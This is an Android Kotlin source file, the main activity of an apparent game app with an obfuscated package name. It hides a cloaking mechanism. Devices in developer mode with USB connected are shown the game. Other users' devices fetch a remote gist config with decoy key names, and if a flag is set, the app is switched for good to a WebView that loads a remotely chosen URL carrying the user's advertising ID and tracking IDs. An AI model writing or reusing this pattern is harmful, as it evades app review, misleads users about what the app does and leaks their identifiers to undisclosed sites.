package com.jjjj.ooo.kkk.eer

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.webkit.*
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.jjjj.ooo.kkk.eer.databinding.ActivityMainBinding
import com.jjjj.ooo.kkk.eer.util.*
import com.jjjj.ooo.kkk.eer.webView.webViewFragment
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.collect
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        lateinit var binding: ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

        var webViewURL = "google.com"

        val lottie        by lazy { Lottie(binding) }
        val advertisingId by lazy { AdvertisingIdClient.getAdvertisingIdInfo(appContext).id }
        const val REMOTE_URL = "https://gist.githubusercontent.com/mcartyeb/d90c60dcbfb5f2c7483504b2c2eeb7d8/raw/com.jjjj.ooo.kkk.eer"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Internet = ${haveInternetConnection()}")

        if (haveInternetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.Main) {

                withContext(Dispatchers.IO) { checkDataStore() }

                startFragmentIdFlow.collect { fragmentId ->
                    requestedOrientation = when (fragmentId) {
                        R.id.gameFragment    -> {
                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentWidth(binding.lottieLoader.id, .25f)
                                }.applyTo(rootCL)
                            }
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        R.id.webViewFragment -> {
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }
                    setStartDestination(fragmentId)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment?.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    private suspend fun checkDataStore() {
        when (DataStoreManager.Key.get()) {
            "Web"  -> {
                log("DataStoreManager Key = Web")
                DataStoreManager.Link.get()?.let {
                    webViewURL = it
                    startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                    OneSignalUtil.initialize()
                }
            }
            "Game" -> {
                log("DataStoreManager Key = Game")
                startFragmentIdFlow.tryEmit(R.id.gameFragment)
            }
            else   -> {
                log("DataStoreManager Key = NONE")
                if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) startFragmentIdFlow.tryEmit(R.id.gameFragment)
                else {
                    initServices()
                    getRemoteData()
                }
            }
        }
    }

    private fun initServices() {
        FacebookUtil.initialize()
        AppsflyerUtil.initialize(this)
    }

    private suspend fun getRemoteData() {
        try {
            NetworkUtil.service.getJsonByUrl(REMOTE_URL).body()?.string()?.let { data ->
                JSONObject(data).also { json ->
                    log("json = $json")

                    val flag = json.getBoolean("accept")
                    webViewURL = json.getString("stopped")

                    val bar     = json.getString("using")
                    val worried = json.getBoolean("next")
                    val repeat  = json.getBoolean("adult")
                    val warn    = json.getString("importance")
                    val design  = json.getString("pair")
                    val desert  = json.getBoolean("rest")
                    val farther = json.getString("straw")
                    val under   = json.getString("ground")

                    log("Test: $bar$worried$repeat$warn$design$desert$farther$under")

                    withContext(Dispatchers.IO) {
                        if (flag) {
                            DataStoreManager.Key.update { "Web" }
                            DataStoreManager.Link.update { webViewURL }
                            R.id.webViewFragment
                        } else {
                            DataStoreManager.Key.update { "Game" }
                            R.id.gameFragment
                        }.also {
                            if (it == R.id.webViewFragment) {
                                AppsflyerUtil.campaignFlow.collect { campaign ->
                                    webViewURL = "${webViewURL}?" +
                                            "google_advertising_id=$advertisingId&" +
                                            "appsflyer_id=${AppsflyerUtil.UID}&" +
                                            "campaign_name=$campaign&" +
                                            "facebook_deeplink=${FacebookUtil.deeplink}"
                                    log(webViewURL)
                                    withContext(Dispatchers.Main) {
                                        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                                        setStartDestination(it)
                                    }
                                }
                            } else startFragmentIdFlow.tryEmit(it)
                        }
                    }
                }
            } ?: throw Exception("Fail get RemoteData!")
        } catch (e: Exception) {
            log("getRemoteData error: ${e.message}")
            startFragmentIdFlow.tryEmit(R.id.gameFragment)
        }
    }

}